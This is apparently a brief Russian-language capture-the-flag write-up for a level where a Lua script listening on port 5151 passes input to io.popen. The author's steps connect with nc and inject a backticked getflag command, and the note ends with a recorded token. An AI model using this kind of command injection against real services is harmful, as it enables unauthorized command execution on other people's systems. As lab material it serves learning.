В папке скрипт lua, он:
	слушает порт 5151
	выполняет команду (строка io.popen)

Следующими действиями отправляем команду в скрипт:
nc localhost 5151
`getflag > /tmp/test`
cat /tmp/test

token: fa6v5ateaw21peobuub8ipe6s